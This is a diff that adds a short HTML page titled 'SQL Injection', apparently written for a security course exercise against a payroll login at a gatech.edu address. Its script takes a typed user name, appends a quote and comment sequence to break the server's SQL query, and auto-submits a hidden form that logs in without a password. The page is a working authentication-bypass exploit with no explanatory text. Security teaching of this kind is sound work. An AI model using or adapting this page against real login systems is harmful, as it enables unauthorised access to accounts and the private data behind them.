@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>SQL Injection</title>
+		<script>
+		</script>
+	</head>
+		<body>
+			<input name="visible_login" id="targetlogin" value="" />
+			<button id="exploit" onclick="logmein()">Log In</button>		
+			<form style="display: none" method="post" action="http://payroll.gatech.edu">
+				<fieldset>
+				<input name="secret" value="whatdoido?" type="hidden">
+				<input name="login" id="login" value="" type="text">
+				<input name="pw" type="password">
+				<input name="action" value="login">
+				</fieldset>
+			</form>	
+		<script>
+			function logmein(){
+				a = document.getElementById('targetlogin')
+				l = document.getElementById('login')
+				l.value = a.value + '\'/* / *'
+				setTimeout(function(){
+					document.forms[0].submit()
+				},1)
+			}
+		</script>
+	</body>
+</html>
